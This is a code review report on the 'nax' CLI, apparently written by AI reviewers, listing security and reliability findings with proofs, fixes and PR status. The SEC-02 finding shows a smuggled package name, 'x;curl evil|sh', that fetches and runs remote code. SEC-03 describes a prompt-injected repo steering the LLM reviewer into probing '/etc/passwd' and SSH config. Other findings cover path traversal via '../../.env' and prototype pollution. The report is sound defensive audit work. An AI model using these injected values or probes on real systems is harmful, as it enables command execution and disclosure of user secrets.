# Deep Code Review: nax (HEAD — v0.80.0-canary.2)

**Date:** 2026-08-14 (rev. 2)
**Reviewer:** opencode (AI) — deep review
**Version:** 0.80.0-canary.2 (HEAD `7d7d11ff`)
**Scope:** full repo — 861 TS/TSX files, ~128K LOC source, 1,129 test files
**Method:** 7 parallel subsystem reviews (execution; pipeline/verification/quality; agents/ACP/routing/interaction; config/context/constitution; cli/commands/tui; plugins/hooks/prd/tdd/acceptance/review/worktree; logger/utils/operations/precheck) + **independent re-verification of every finding against source** (each finding below carries its proof) + gate baseline (`bun run lint` ✅, `bun run typecheck` ✅, spot tests ✅)
**Revision notes (rev 2):** SEC-01 (default permission profile) **discarded** per maintainer decision — see "Discarded findings" below. SEC-06, BUG-13, BUG-22 re-verified and re-worded to match exact code behavior. Grade updated.
**Revision notes (rev 3, 2026-08-14, Claude):** independent second-pass verification of 18 findings against source at HEAD; two severities corrected; priority order regrouped into implementation batches for handover. See "Verification Addendum" and "Fix Plan (handover)" below. No findings added or removed.

---

## Verification Addendum (rev 3)

Second reviewer, independent re-read at each cited `file:line` on HEAD `7d7d11ff`.

**Re-verified and confirmed (18):** SEC-02, SEC-03, SEC-04, SEC-05, SEC-07, SEC-08, BUG-01, BUG-02, BUG-03, BUG-04, BUG-05, BUG-06, BUG-07, BUG-15, BUG-19, BUG-23, BUG-25, BUG-26, BUG-28, MED-03. Every proof snippet matched the code as written.

**Not independently re-verified:** the remaining MEDIUMs and all LOWs. They inherit rev 2's verification pass, which was accurate at every sampled point (18/18) — treat as credible but unconfirmed. Re-check the cited line before fixing.

### Severity corrections

| ID | rev 2 | rev 3 | Basis |
|:---|:---|:---|:---|
| SEC-04 | HIGH | **MEDIUM** | `Bun.serve({ hostname: "127.0.0.1" })` (webhook.ts:428) — loopback-only. Exploit requires an already-local process, which has cheaper DoS options. Still worth fixing; not a release blocker. |
| SEC-03 | HIGH | **HIGH (narrow)** | Containment gap confirmed. But file contents are never logged — the `observed` field logged at semantic-evidence.ts:128 is LLM-supplied, not file data. This is a blind boolean oracle affecting downgrade decisions only, with no exfiltration channel. One-line fix, so priority is unchanged. |
| BUG-07 | HIGH | **HIGH (rare)** | Unconditional `unlink` at lock.ts:83 confirmed; race is real but needs two processes reading the same dead lock in the same window. Severe outcome, low frequency. |

### Ordering change vs rev 2

rev 2 put **BUG-03 in P0**. It is a feature that crashes 100% of the time, so nobody can currently be depending on it — moved to **P2**. **BUG-04** (unbounded spawn in the completion phase, cost accrues indefinitely) takes its P0 slot: same effort, live blast radius.

---

## Status update (2026-08-15)

**Batches 1–5 (all P0/P1 security & reliability findings): ✅ Fixed.** Landed in PR #1588 (commit `fed3681a`, "P0 + P1") covering all of SEC-02/03/05/07/08, BUG-01/02/04/05/06/07/09/10/11/12/13/14/17/18/20/21/24/25/26/28/29, MED-02/03/04/05. **SEC-04 and BUG-08** are HIGH/MEDIUM findings not explicitly named in a batch below — neither was actually touched by #1588 despite being adjacent in severity to what it covered; both were fixed later, in PR #1591 (see next paragraph).

**Batch 6 (dead/inert surfaces, 10 findings) + SEC-04, SEC-09, BUG-08: ✅ Fixed.** Landed in PR #1591 (branch `fix/deep-review-batch6-pending-findings`): SEC-04 (streamed body-size enforcement — closes the gap for real, not just the loopback-only narrowing the severity correction above describes), SEC-06, SEC-09, MED-01, BUG-03 (contained to `dnf-crashed`, **not** made functional — see note below), BUG-08, BUG-15, BUG-16, BUG-19, BUG-22, BUG-23, BUG-27. Went through a `code-reviewer` subagent pass plus an automated security review before merge; both caught real issues (a regression in the BUG-19 fix, a `forceStop` scoping gap, MED-01 pattern tuning) that were fixed in the same PR — see the PR description for the full review trail.

**BUG-03 caveat:** the crash is contained (a bad `worktreeManager`/`pipeline` dependency now yields a per-contestant `dnf-crashed` result instead of crashing the whole CLI), but `_contestantDeps` is still unwired to a real worktree-scoped pipeline implementation anywhere in `src/`/`bin/`. `nax run --compare` will still report every contestant as `dnf-crashed`. Making bake-off actually functional is a feature-completion task (worktree-scoped pipeline execution, per-contestant PRD/config, result aggregation), not a bug fix, and remains open.

**Batch 7 (L1…L38 cleanup): still pending.** Not attempted in either PR — see the batch's own note for which items (L5, L8, L13) have live failure modes worth pulling forward.

---

## Overall Grade: B- (74/100)

| Dimension | Score |
|:---|:---|
| Security | 15/20 |
| Reliability | 13/20 |
| API Design | 16/20 |
| Code Quality | 16/20 |
| Best Practices | 14/20 |

The foundation is genuinely strong: shell-quoting is consistently correct everywhere except one spot, git calls are argv-based, process teardown is carefully engineered, and the crash/checkpoint/mutation subsystems are exemplary. But this release ships a cluster of *verifiable* HIGH-severity defects in exactly the wrong places for a tool that executes PRD-driven work on user repos: **one unquoted shell interpolation** (`{{package}}`) that turns a malicious repo name into arbitrary command execution, an **arbitrary-file-read oracle** in the review evidence substantiator, **`nax config` printing resolved secrets**, a **mutex that doesn't actually serialize** writes (with a documented segfault risk), and the **bake-off (`nax run --compare`) feature being 100% broken in production**. No CRITICAL was confirmed, and most HIGHs have one-line fixes — this is a "great structure, sloppy details" release rather than a design problem.

---

## Findings

### 🔴 CRITICAL
None confirmed. (Strongest candidates — status-writer segfault race, command injection via `{{package}}` — verified but contained/conditional; both are HIGH.)

### 🟠 HIGH

#### SEC-02: Unquoted `{{package}}` interpolation — repo-controlled string executed by `/bin/sh -c`
**Severity:** HIGH | **Category:** Security
**File:** `src/quality/command-resolver.ts:73-75` → `src/operations/full-suite-gate.ts:121-177` → `src/verification/runners.ts:155` → `src/verification/executor.ts:79-81`
**Proof (verified):** `readPackageName` (command-resolver.ts:40-47) reads the target repo's `package.json` `name` raw; `rawScopedTemplate.replaceAll("{{package}}", pkgName)` (line 73-75) substitutes it with no quoting; `full-suite-gate.ts:130` promotes the result to `testCommand` for turbo/nx; `runTests` (line 160-168) passes it to `regression({ command, shell })`; `executor.ts:79` executes `spawn([shell, "-c", command])`.
```ts
// command-resolver.ts:73-75
resolvedScopedTemplate = pkgName !== null ? rawScopedTemplate.replaceAll("{{package}}", pkgName) : undefined;
```
**Risk:** A repo whose name is `x;curl evil|sh` yields `bunx turbo run test --filter=x;curl evil|sh` → arbitrary command execution on the user's machine. Violates the trust contract documented in `src/verification/executor.ts:59-64`. The very next file over (`shell-quote.ts`) has the fix.
**Fix:** Shell-quote the substituted value (reuse `shellQuoteArg`) or reject names with characters outside `[A-Za-z0-9_./@-]`.

#### SEC-03: Reviewer evidence substantiator reads arbitrary absolute paths (file-existence/content oracle)
**Severity:** HIGH | **Category:** Security
**File:** `src/review/semantic-evidence.ts:150-156`
**Proof (verified):** after `validateModulePath(file, roots)` (contained) fails, the code falls through to `if (isAbsolute(file))` and reads any absolute path. `matchesEvidence` (line ~159) uses the content as a substring oracle against the LLM-supplied `observed` text; a match flips downgrade/keep decisions.
```ts
if (isAbsolute(file)) {
  try { return await Bun.file(file).text(); } catch { return null; }
}
```
**Risk:** A prompt-injected repo under review can direct the reviewer to probe arbitrary files (`/etc/passwd`, `~/.ssh/config`) membership-wise. Every other read in the review pipeline is contained (`readCapped`, `validateModulePath`) — this one has zero containment.
**Fix:** Delete the `isAbsolute` fallback, or contain via `validateModulePath` against `repoRoot`/`workdir`.

#### SEC-04: Webhook callback enforces payload size only *after* fully buffering the body

**Status:** ✅ Fixed — PR #1591 (streamed body reads with an early abort once `maxPayloadBytes` is exceeded).
**Severity:** HIGH | **Category:** Security
**File:** `src/interaction/plugins/webhook.ts:483-502`
**Proof (verified):** Content-Length pre-check (line 486) is bypassable (chunked transfer); the authoritative check runs on `await req.text()` (line 491) — the full body is already in memory. Rate limiter bounds request count (300/window), not size.
```ts
body = await req.text();
if (new TextEncoder().encode(body).byteLength > maxBytes) { ... }
```
**Risk:** A co-tenant process can push ~128MB/request × 300 against the loopback endpoint despite configured `maxPayloadBytes` (1MB) — memory pressure / DoS.
**Fix:** Stream-read `req.body.getReader()` and abort once accumulated bytes exceed `maxPayloadBytes`; reject when Content-Length missing/over-limit.

#### SEC-05: `nax config` prints resolved secrets in plaintext
**Severity:** HIGH | **Category:** Security
**File:** `src/cli/config-display.ts:98` (also :81-90), `src/config/loader.ts:152-156`, `src/config/schemas-model.ts:17`
**Proof (verified):** `models.<agent>.<tier>.env` is `z.record(z.string(), z.string())` (schemas-model.ts:17); profile overlay resolves every `$VAR` to plaintext before merge (loader.ts:152-156); the default view does `console.log(JSON.stringify(config, null, 2))` with no masking. `config profile show` has `maskProfileValues` (config-profile.ts:95-109) — proving the team knows this data is sensitive.
**Risk:** Resolved API keys land in terminal scrollback, CI logs, and captured output.
**Fix:** Mask before printing (reuse `maskProfileValues`) or print unresolved `$VAR` references.

#### BUG-01: `StatusWriter.update()` mutex is ineffective — heartbeat and main-loop writes race on the same `.tmp` file
**Severity:** HIGH | **Category:** Reliability
**File:** `src/execution/status-writer.ts:212-214`
**Proof (verified):** `_doUpdate` is an async function *invoked before* it is chained, so it runs synchronously up to its first `await` (`writeStatusFile` → `unlink(tmpPath)`); a second `update()` starts its own unlink/write/rename concurrently. The module's own comment (lines 73-83) says this exact interleave "causes a JSC segfault" on macOS x64 (Bun 1.3.9). `writeFeatureStatus` (lines 265-279) correctly defers the write into the chain — the correct pattern exists in the same file.
```ts
const write = this._doUpdate(totalCost, iterations, overrides); // ← invoked EAGERLY
this._mutex = this._mutex.then(() => write).catch(() => write);
```
**Risk:** Heartbeat updates (crash-heartbeat.ts:73) land while the main loop is mid-write → torn `.tmp` writes / segfault.
**Fix:** Defer: `this._mutex = this._mutex.then(() => this._doUpdate(...)).catch(() => this._doUpdate(...));`

#### BUG-02: Quality-command timeout kills only the `/bin/sh` wrapper — grandchildren leak
**Severity:** HIGH | **Category:** Reliability
**File:** `src/quality/runner.ts:114-120` (contrast `src/verification/executor.ts:86-92`)
**Proof (verified):** quality/runner.ts spawns `/bin/sh -c <cmd>` **without** `detached: true`; executor.ts:86-92 (same repo, same pattern) documents that Bun does not setpgid children by default and that `detached: true` (setsid) is required for `killProcessGroup(-pid)` to reach the real worker — otherwise only the sh wrapper dies.
**Risk:** `bun run lint` → eslint, `bunx tsc`, etc. survive the 120s timeout as orphans, holding the terminal/resources.
**Fix:** Add `detached: true` to the spawn (mirroring `executeWithTimeout`).

#### BUG-03: `nax run --compare` (bake-off) always crashes — production deps never wired

**Status:** ⚠️ Partially fixed — PR #1591 contains the crash (per-contestant `dnf-crashed` instead of a whole-CLI crash), but `_contestantDeps` is still unwired. Bake-off is not functional; see the PR/status-update note above.
**Severity:** HIGH | **Category:** Bug
**File:** `src/bakeoff/contestant.ts:49-52,101`
**Proof (verified):** `_contestantDeps` holds `undefined as unknown as ...` stubs; grep across src/ and bin/ finds no installation site ("Production wiring installs these via init steps" is false). `bin/nax.ts:793-807` calls `runContestant(agent, options)` (2 args) → line 101 `await deps.worktreeManager.create(...)` throws `TypeError` **outside** the try/catch (starts line 103).
**Risk:** The feature is 100% broken — the CLI crashes on every bake-off invocation.
**Fix:** Wire real deps at CLI startup or construct when absent; move `worktreeManager.create` inside the try/catch so failure yields `dnf-crashed` instead of a crash.

#### BUG-04: Hardening-pass acceptance tests spawn with no timeout — run hangs forever
**Severity:** HIGH | **Category:** Reliability
**File:** `src/acceptance/hardening.ts:158-164`
**Proof (verified):** `_hardeningDeps.spawn(testCmd, {...})` then `Promise.all([proc.exited, text(stdout), text(stderr)])` with no wall-clock bound and no SIGTERM/SIGKILL escalation (contrast `runQualityCommand`'s 120s default at quality/runner.ts:18,136-145).
**Risk:** The test code is LLM-generated (`acceptanceGenerateOp`); a hang (open server, `watch` mode) wedges the run's completion phase indefinitely. Cost keeps accruing; nothing else proceeds.
**Fix:** Route through `runQualityCommand` or add a hard timeout + `killProcessGroup` escalation; `timeoutMs` from `ctx.config.acceptance`.

#### BUG-05: Per-package config overrides bypass the entire validation/guard chain (incl. scoped-profile guard)
**Severity:** HIGH | **Category:** Security/Reliability
**File:** `src/config/loader.ts:324-336` (and `loadPackageOverride` :251)
**Proof (verified):** the package-overlay path (no per-package profile) does merge → `stripRemovedNoOpKeys` → `return`, with **no** `rejectLegacyAgentKeys`, `rejectLegacyRectificationKeys`, `rejectDeadQualityFlags`, `rejectUnimplementedScopedProfile`, or `NaxConfigSchema.safeParse` — those run only in the `packageChain.length > 0` branch (loader.ts:353-361). The root chain HAS the guards (loader.ts:203,211) — the package overlay is the gap. `rejectUnimplementedScopedProfile`'s own doc (config-guards.ts:273-290) says a silent "scoped" resolution is exactly the downgrade it exists to prevent.
**Risk:** A `.nax/mono/<pkg>/config.json` with `permissionProfile: "scoped"` or legacy `autoMode.defaultAgent` sails through; type-invalid per-package values flow unvalidated into the run.
**Fix:** Hoist the guards + `safeParse` to cover the merged result on both package paths.

#### BUG-06: `agent: null` in a per-package override crashes config load with a raw TypeError
**Severity:** HIGH | **Category:** Bug
**File:** `src/config/merge.ts:69-79`
**Proof (verified):** the merge gate is `packageOverride.agent !== undefined` — `null !== undefined` is true, so `packageOverride.agent.promptAudit?.enabled` dereferences `null.promptAudit` → `TypeError: Cannot read properties of null`. Reachable from `loadConfigForWorkdir` (loader.ts:325) and `createPackageRegistry.hydrate` (src/runtime/packages.ts:107). `hasAnyMergeableField` (line ~50-60) has the same `!== undefined` gate.
**Risk:** One `"agent": null` in a package config bricks the whole run with an unhelpful TypeError instead of a Zod error naming the key.
**Fix:** Gate on `!= null` in the has-field check and every merge branch; validate the override through a zod partial before merging.

#### BUG-07: Stale-lock removal TOCTOU — two processes can hold the execution lock concurrently
**Severity:** HIGH | **Category:** Reliability
**File:** `src/execution/lock.ts:68-96`
**Proof (verified):** read stale lock → `unlink(lockPath)` unconditionally (line ~83) → create with O_EXCL (line ~93). Sequence: A and B both read the same stale lock → A unlinks, A creates fresh lock (O_EXCL wins) → B unlinks (deleting **A's live lock**) → B creates its own. `O_EXCL` only guards create-vs-create, not unlink-of-live-lock.
**Risk:** Two processes run concurrently in the same workdir: concurrent PRD writes, worktree creation, `.nax-pids`/status.json corruption.
**Fix:** Unlink conditionally on content unchanged (read → compare → unlink), or rename stale lock to a tombstone before re-creating.

### 🟡 MEDIUM

#### SEC-06: Global monkey-patch of `Bun.serve` + `globalThis.fetch` as a module side effect

**Status:** ✅ Fixed — PR #1591 (install deferred to first server start; port-reuse hardened).
**Severity:** MEDIUM | **Category:** Security/Quality
**File:** `src/interaction/plugins/webhook-serve-compat.ts:55-90` (installed at webhook.ts:15-17)
**Proof (verified):** `installServePortZeroCompat` rewrites `Bun.serve` and `globalThis.fetch` process-wide. Scope note (rev 2): the patched fetch intercepts **only** ports registered in `inMemoryServers` (i.e. while a compat in-memory server is live — itself only created when `Bun.serve` genuinely fails), so unrelated-fetch misrouting requires an in-memory server to be active; the wrap hazard is real but narrower than originally worded.
**Risk:** (a) Any unrelated in-process fetch to a compat-registered port (40000–59999) is routed to the webhook handler instead of the real server; (b) the port counter wraps after 20k cycles and can overwrite a live entry; (c) global side effect on mere import.
**Fix:** Avoid global patching — inject compat only where needed (Telegram already does dependency-injected fetch).

#### SEC-07: Deep-merge allows `__proto__` key to tamper with a config object's prototype
**Severity:** MEDIUM | **Category:** Security
**File:** `src/config/merger.ts:130` (also :88, :76)
**Proof (verified):** `Object.keys(override)` includes an own `__proto__` key (JSON.parse defines it as own); `result[key] = overrideValue` (line 130) triggers the `Object.prototype.__proto__` setter, replacing the merged object's prototype with attacker data. `constructor` also defeats `isPlainObject`'s `value.constructor === Object` check (:143), degrading deep merges to replacement merges.
**Risk:** Untrusted project config shapes the merged object's prototype chain; reads of schema-stripped keys resolve through attacker data. Hard to reason about, easy to fix.
**Fix:** Skip `__proto__`/`constructor`/`prototype` keys or create results via `Object.create(null)`; mirror in the hooks special case.

#### SEC-08: Profile name flows unvalidated into a path join (traversal read of arbitrary `*.json`)
**Severity:** MEDIUM | **Category:** Security
**File:** `src/config/profile.ts:25-26` (also :63-64)
**Proof (verified):** `loadProfile` joins `${globalConfigDir()}/profiles/${profileName}.json` with a raw name; `join` silently collapses `..`, so `profileName = "../../../.config/foo"` escapes the profiles dir. Sources: CLI `--profile`, `NAX_PROFILE` env, or the **project** `.nax/config.json` `profile` field (profile.ts:174) — a repo can therefore cause reads of arbitrary `*.json` under the user's home, deep-merged with profile precedence, and its `quality.commands` executed. `fragments/store.ts:75-89` has the right guard; this path lacks it.
**Fix:** Validate `profileName` as a single path segment at all three entry points.

#### SEC-09: No ANSI/escape-sequence sanitization on agent-controlled display strings

**Status:** ✅ Fixed — PR #1591 (shared `stripControlChars()` applied to TUI panel rows and the headless log formatter).
**Severity:** MEDIUM | **Category:** Security
**File:** `src/tui/components/StoriesPanel.tsx:159-164`, `LiveActivityPanel.tsx:147-159`, `src/log-format/formatter.ts:278`
**Proof (verified):** story failure reasons (`slice(0, 25)`), titles, agent/model names render raw into Ink `<Text>`; Ink does not sanitize ESC sequences.
**Risk:** Crafted `prd.json` or agent output containing `\x1b[` sequences can move the cursor, clear the screen, or write to the clipboard (OSC 52) in a terminal showing the user's context. Defense-in-depth (LLM already writes code), but cheap to fix.
**Fix:** One shared ESC/OSC strip util applied in TUI row renderers and the log formatter.

#### BUG-08: Escalation quote-verifier reads files outside the workdir (path traversal)

**Status:** ✅ Fixed — PR #1591 (routed through the existing `validateModulePath` containment guard). Not touched by PR #1588 despite the "Re-verified and confirmed" list above naming other findings in that pass.
**Severity:** MEDIUM | **Category:** Security
**File:** `src/execution/escalation/quote-integrity.ts:46,80`
**Proof (verified):** regex `[a-zA-Z0-9_./-]+` admits `..`; `absPath = \`${workdir}/${triple.file}\`` with no containment check; `deps.readFile(absPath)` reads it.
**Risk:** LLM-authored escalation reasons (agent-controlled, persisted to `priorErrors`) can cite `../../.env` and get verified outside the repo — evidence that influences next-tier decisions.
**Fix:** Resolve + require containment under `workdir`; skip escaping triples.

#### BUG-09: `appendProgress` is unguarded on terminal failure paths — bookkeeping failure aborts the run
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/execution/progress.ts:23-27`; callers `pipeline-result-handler.ts:381`, `tier-escalation.ts:282`, `tier-outcome.ts:42-47,108-113,136-138`
**Proof (verified):** `appendProgress` does `mkdir` + `appendFile` with no try/catch; all callers sit on terminal failure paths.
**Risk:** On an unwritable `featureDir` (disk full, permissions), the story-failure/escalation handler itself throws mid-failure-handling, crashing the whole run and skipping `markStoryFailed`/savePRD.
**Fix:** Best-effort try/catch inside `appendProgress` (warn on failure) — same as crash-writer.

#### BUG-10: `withQueueFileLock` unlinks a live holder's lock once older than 30s
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/utils/queue-file-lock.ts:59`
**Proof (verified):** `if (pid !== null && age <= MAX_LOCK_AGE_MS && isPidAlive(pid))` keep, else unlink — a slow-but-legitimate holder older than 30s loses mutual exclusion even while alive.
**Fix:** Gate unlink on `!isPidAlive(pid)`; keep the 30s bound only for unparseable timestamps.

#### BUG-11: Queue commands re-applied if process dies between rename and clear
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/execution/queue-handler.ts:57-59`
**Proof (verified):** `readQueueFile` re-reads `.queue.txt.processing` if present and returns its commands; a crash between rename and clear re-applies them next run (INJECT re-injects an already-injected story).
**Fix:** Process + clear inside one lock critical section (crash leaves `.queue.txt`, not `.processing`, as recoverable state).

#### BUG-12: Acceptance gate passes when all failed ACs are overridden but the suite crashed
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/pipeline/stages/acceptance.ts:234-294,332-375`
**Proof (verified):** the AC-ERROR sentinel (line ~250) fires only when `failedACs.length === 0 && exitCode !== 0`. If `failedACs.length > 0` but every AC is in `acceptanceOverrides`, `actualFailures` is empty → nothing pushed to `allFailedACs`/`failedPackages` → `allFailedACs.length === 0` → "All packages passed" → `{ action: "continue" }` despite `exitCode !== 0`. A suite crash (hook timeout, import error) alongside overridden ACs is silently masked.
**Fix:** Treat `exitCode !== 0 && failedACs.length > 0` as failure when `actualFailures.length === 0`.

#### BUG-13: Post-SIGKILL stream reads in completion stage lack a settle deadline — potential permanent hang
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/pipeline/stages/completion.ts:285-297,329-341`
**Proof (verified, rev 2 refinement):** a `GIT_TIMEOUT_MS` SIGKILL timer **does** exist (line ~286-295) — the gap is narrower than originally worded: the `Promise.all([readTextStreamPrefix(proc.stdout,...), readTextStreamPrefix(proc.stderr, 0), proc.exited])` has no `raceWithDeadline` fallback, so if a pipe fails to close after SIGKILL (the exact Bun behavior documented at `executor.ts:145-146`, which guards with `raceWithDeadline`), the `await` never settles and run completion blocks forever.
**Fix:** Wrap the stream reads in the existing `raceWithDeadline` helper (or a shared drain deadline).

#### BUG-14: Event-bus fire-and-forget subscriber promises unbounded; `drain()` awaits them all
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/pipeline/event-bus.ts:284-298,330-333`; awaited at `unified-executor.ts:379/534/620`, `run-completion.ts:444`
**Proof (verified):** `emit()` adds every async subscriber result to `_pending` until it settles; `drain()` awaits `Promise.allSettled([...this._pending])` — no per-subscriber timeout.
**Risk:** One never-settling subscriber (hung hook script, webhook interaction) makes `drain()` hang the run at every story boundary; `_pending` grows unbounded until then.
**Fix:** Race each tracked promise against a settle deadline; drop + log on timeout.

#### BUG-15: Per-model `env` overrides are silently dropped in the ACP-only adapter

**Status:** ✅ Fixed — PR #1591 (`buildAllowedEnv`'s existing `modelEnv` option threaded through both `createClient` call sites).
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/agents/acp/spawn-client.ts:94`, `src/config/schemas-model.ts:17`
**Proof (verified):** `models.<agent>.<tier>.env` is a first-class schema field; `SpawnAcpClient` constructor calls `this.env = buildAllowedEnv()` with no options, and `AcpClientOptions` has no `env` field — no consumer of `modelDef.env` anywhere in src.
**Risk:** A user configuring a per-model API key/base URL gets it silently ignored; the subprocess runs on ambient env and fails with confusing auth errors.
**Fix:** Thread `modelDef.env` through `AcpClientOptions.env` → `buildAllowedEnv`.

#### BUG-16: `closePhysicalSession({ force: true })` silently no-ops — errored sessions never hard-terminated

**Status:** ✅ Fixed — PR #1591 (`forceStop` implemented on `SpawnAcpClient`, scoped to the client's worktree via `--cwd` after a review-round fix).
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/agents/acp/adapter-close-physical.ts:23-28`
**Proof (verified):** grep shows `forceStop` exists only at this cast site — no production class implements it; the `else if (client.loadSession)` fallback is dead because `SpawnAcpClient` always has `closeSession`. So `session-manager-runtime.ts:119`'s force close never terminates the acpx queue-owner.
**Fix:** Implement `forceStop` on `SpawnAcpClient` (spawn `acpx <agent> stop`) or delete the branch; add a test asserting force terminates.

#### BUG-17: Trigger fallback policy ignored on timeout for every trigger except `review-gate`
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/interaction/triggers.ts:129-208` (only `checkReviewGate` :223 applies fallback)
**Proof (verified):** `checkSecurityReview`/`checkCostExceeded`/`checkMergeConflict`/`checkCostWarning`/`checkMaxRetries`/`checkPreMerge` compare `response.action` directly. `chain.applyFallback` (chain.ts:154-171) is the mechanism that maps timeout → configured fallback, used only by `checkReviewGate` (triggers.ts:223-227). On timeout, plugins return `{ action: "skip", respondedBy: "timeout" }`, so `checkCostExceeded` (a live gate at unified-executor.ts:69) **proceeds** even when its fallback is `abort`.
**Fix:** Route every trigger through `chain.applyFallback(response, fallback)` before comparing action.

#### BUG-18: Webhook `send()` fetch has no timeout; context-tool interactions have no deadline — hung URL hangs the run
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/interaction/plugins/webhook.ts:253-258`, `src/agents/acp/adapter.ts:486-490`
**Proof (verified):** `await fetch(this.config.url, {...})` with no AbortController (Telegram has explicit 8s/4s timeouts); the context-tool path in `sendTurn` races only against abort.
**Risk:** A black-holing webhook URL stalls the story indefinitely (question path masked by a 5-min race).
**Fix:** AbortController timeout on the fetch (default ~30s) and/or a deadline race in `sendTurn`'s context-tool path.

#### BUG-19: Module-level `getInstalledAgents()`/`checkAgentHealth()` registry stubs return `[]` — multi-agent precheck is dead

**Status:** ✅ Fixed — PR #1591. First pass had a real regression (collapsed "all known agents" and "installed agents" into the same set, so `installed` was always `true`, keeping the "available but not installed" precheck section dead for a different reason) — caught by code review and fixed via a new `getAllAgents()` before merge.
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/agents/registry.ts:31-39`, `src/agents/shared/version-detection.ts:9,76-100`
**Proof (verified):** `version-detection.ts:9` imports the module-level `getInstalledAgents` (stub `return []`), and `getAgentVersions` calls it twice (lines 77 and 82) — always returns `[]`, so `multi-agent-health` precheck always reports "No additional agents detected". The real implementation exists only inside `createAgentRegistry()`.
**Fix:** Point `version-detection.ts` at the registry instance; drop the double call.

#### BUG-20: Schema default drift — `execution` timeouts differ depending on config shape
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/config/schemas.ts:124,136,142` vs `src/config/schemas-execution.ts:58,88,177`
**Proof (verified):** inner defaults are `verificationTimeoutSeconds: 300` (schemas-execution.ts:177), `rectification.fullSuiteTimeoutSeconds: 120` (:58), `regressionGate.timeoutSeconds: 120` (:88); the outer `ExecutionConfigSchema.default({...})` literal (schemas.ts:124,136,142) hardcodes 600/300/300 and is used as-is by zod (`.default()` does not re-parse). `parse({})` yields the outer values; a partial execution config yields the inner ones.
**Risk:** Same key, two effective defaults depending on parent presence — verification/rectification/regression timeouts silently differ 2×.
**Fix:** Derive the outer literal from the inner schema (pattern already used for `context` at schemas.ts:309).

#### BUG-21: Profile `$VAR` resolution throws on any unresolved env ref and ignores the documented env base
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/config/dotenv.ts:66-76`, `src/config/profile.ts:57-60`
**Proof (verified):** `resolveString` throws a bare `Error` on any unresolved `$VAR`; `loadProfileEnv` builds the env map from profile `.env` files only — process.env is never the base, contradicting its own docstring ("both override process.env entries").
**Risk:** A profile referencing `$HOME` or `$GITHUB_TOKEN` hard-fails config load before zod.
**Fix:** Fold `process.env` into the base map, or document the throw and wrap in `NaxError` with profile name + key path.

#### BUG-22: TUI exit paths leave the TUI mounted; `q`+confirm only hides the UI (run keeps executing)

**Status:** ✅ Fixed — PR #1591 (remaining gaps: `--parallel`/schedule-cancel exits now unmount first; a Ctrl+<letter> combo no longer falls through to the matching bare-letter shortcut).
**Severity:** MEDIUM | **Category:** Reliability
**File:** `bin/nax.ts:743` vs :757-765, :783-786; `src/tui/App.tsx:149-156,191-209`; `src/tui/hooks/useKeyboard.ts:113-141`
**Proof (verified, rev 2 refinement):** (a) `--parallel` validation `exit(1)` and schedule-cancel `exit(0)` fire **after** `renderTui` (bin/nax.ts:743) without `unmount()` — message prints over the TUI frame. (b) `q`+`y` calls `exit()` only (UI unmount) — the runner keeps executing with no visible UI; **a real abort exists but only via `a`+confirm** (writes `ABORT` queue command, App.tsx:198-200) — the original wording overstated "no way to stop"; the defect is that `q` misleads the user into thinking the run quit while spend continues, and Ctrl+C lands on `SHOW_COST` (useKeyboard case "c") instead of quit/abort.
**Fix:** On quit-confirm, write `{ type: "ABORT" }` to the queue file in addition to `exit()`; explicit ctrl+c branch in `useKeyboard`; hoist `--parallel` validation before `renderTui`; unmount before schedule-cancel exit.

#### BUG-23: `nax run --json` silently ignored when stdout is a TTY

**Status:** ✅ Fixed — PR #1591 (`formatterMode === "json"` added as a fourth headless trigger; extracted to a testable `resolveUseHeadless()`).
**Severity:** MEDIUM | **Category:** Bug
**File:** `bin/nax.ts:532-540,688-690`
**Proof (verified):** `useHeadless = !isTTY || headlessFlag || headlessEnv` — `formatterMode === "json"` not considered; on a TTY the TUI mounts and `formatterMode: undefined` is passed to `run()` (bin/nax.ts:697).
**Fix:** `useHeadless = ... || formatterMode === "json"`.

#### BUG-24: `nax prompts` leaks the runtime (never closed)
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/cli/prompts-main.ts:75-77`
**Proof (verified):** `createRuntime(config, workdir)` at line ~75; grep confirms zero `close()`/`runtime.close` occurrences in the file — ACP sessions/streams, auditors, and the idle-watchdog subscription stay alive until process exit. Every planning path closes its runtime.
**Fix:** `try/finally { await runtime.close(); }` around the story loop.

#### BUG-25: `isStalled` treats `failed` as terminal while the selector retries failed stories — single-story runs pause instead of retrying
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/prd/types.ts:268-289` with `src/prd/index.ts:105-124`, `src/execution/unified-executor.ts:643`
**Proof (verified):** `isResumableCurrentStory` (prd/index.ts:105-110) retries a `failed` story while `attempts <= maxRetries` (default 12); `getNextStory` Priority 1 returns it immediately. `isStalled` puts `failed` into `blockedIds` and returns true when all remaining are blocked — so a single-story PRD pauses as "stalled" on the first failure while the same story IS retried when a sibling ready story exists.
**Fix:** Exclude a `failed` story from "can't progress" while `attempts <= maxRetries` (thread the budget into `isStalled`).

#### BUG-26: PRD schema silently downgrades any story with a non-empty `noTestJustification` to `testStrategy: "no-test"`
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/prd/schema.ts:217-223`
**Proof (verified):** the auto-correct branch downgrades on *any* non-empty justification string, regardless of content — a planner emitting `testStrategy: "test-after"` plus a stray note silently loses all test generation (greenfield/full-suite gates never exercise the story). The comment documents the debate-synthesis rationale, but the condition is broader than that scenario.
**Fix:** Keyword-gate the downgrade (text actually explains absent tests) or drop the auto-downgrade.

#### BUG-27: Dependency cycles not validated at plan time → `topologicalSort` throws and aborts the merge batch

**Status:** ✅ Fixed — PR #1591 (`validatePlanOutput` now fails fast on a cycle; `mergeAll` also defensively catches `topologicalSort`'s throw for PRDs written outside the validated path).
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/worktree/merge.ts:174-176,272-284`, `src/prd/schema.ts:234-242`
